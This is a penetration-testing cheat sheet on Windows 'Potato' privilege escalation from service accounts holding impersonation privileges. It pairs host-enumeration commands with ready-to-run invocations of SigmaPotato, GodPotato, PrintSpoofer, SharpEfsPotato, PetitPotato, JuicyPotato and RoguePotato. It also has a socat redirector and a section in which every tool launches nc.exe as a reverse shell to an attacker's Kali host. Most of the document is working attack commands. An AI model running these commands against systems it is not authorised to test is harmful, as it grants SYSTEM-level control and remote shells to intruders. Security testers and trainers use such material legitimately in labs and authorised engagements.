# Potato privilege escalation

## Check the host
Service shell (IIS/MSSQL): needs `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege`.

```powershell
whoami /all
whoami /priv
Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,BuildNumber,OSArchitecture
[System.Environment]::Version
```
```powershell
sc.exe query Spooler
sc.exe query EFS
sc.exe query RasMan
sc.exe query InventorySvc
sc.exe query PcaSvc
```

| Available | Use |
| --- | --- |
| RPCSS/DCOM, newer host | SigmaPotato / GodPotato |
| Print Spooler running | PrintSpoofer |
| EFSRPC | SharpEfsPotato / PetitPotato |
| Older Windows + matching elevated CLSID | JuicyPotato |
| TCP/135 redirector from Kali + COM route | RoguePotato |

- Test with `whoami > file`: a spawned console may be invisible.

## Commands
DCOM/RPCSS:
```powershell
.\SigmaPotato.exe 'cmd /c whoami > C:\Windows\Temp\sigma.txt'
.\GodPotato-NET4.exe -cmd 'cmd /c whoami > C:\Windows\Temp\god.txt'
```
Spooler:
```powershell
.\PrintSpoofer64.exe -c 'cmd /c whoami > C:\Windows\Temp\print.txt'
```
EFSRPC:
```powershell
.\SharpEfsPotato.exe -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\sharp-efs.txt'
.\PetitPotato.exe 3 'cmd.exe /c whoami > C:\Windows\Temp\petit.txt'
```
Older host + CLSID:
```powershell
.\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a '/c whoami > C:\Windows\Temp\juicy.txt' -t '*' -c '{<CLSID>}'
```
RoguePotato (target must reach Kali TCP/135):
```bash
sudo socat TCP-LISTEN:135,reuseaddr,fork TCP:<IP>:9999
```
```powershell
.\RoguePotato.exe -r <KALI> -e 'cmd.exe /c whoami > C:\Windows\Temp\rogue.txt' -l 9999
```
- Check local binary syntax (`--help`); read the output file: "completed" is not an identity check.

## Reverse shell (more stable than `whoami > file`)
Upload `nc.exe` first ([file-transfer](../foothold/file-transfer.md)), listener on Kali: `nc -lvnp <PORT>`.

```powershell
.\SigmaPotato.exe 'C:\Windows\Temp\nc.exe <KALI> <PORT> -e cmd'
.\GodPotato-NET4.exe -cmd 'C:\Windows\Temp\nc.exe <KALI> <PORT> -e cmd'
.\PrintSpoofer64.exe -c 'C:\Windows\Temp\nc.exe <KALI> <PORT> -e cmd'
.\SharpEfsPotato.exe -p C:\Windows\Temp\nc.exe -a '<KALI> <PORT> -e cmd'
.\PetitPotato.exe 3 'C:\Windows\Temp\nc.exe <KALI> <PORT> -e cmd'
.\JuicyPotato.exe -l 1337 -p C:\Windows\Temp\nc.exe -a '<KALI> <PORT> -e cmd' -t '*' -c '{<CLSID>}'
.\RoguePotato.exe -r <KALI> -e 'C:\Windows\Temp\nc.exe <KALI> <PORT> -e cmd' -l 9999
```
- Confirm with `whoami` in the new shell.

## When it fails
- No token privilege → none of these work.
- Spooler disabled rules out PrintSpoofer only, not EFSRPC or DCOM.
- Wrong service/endpoint/CLSID/.NET runtime/architecture/network path for this host.
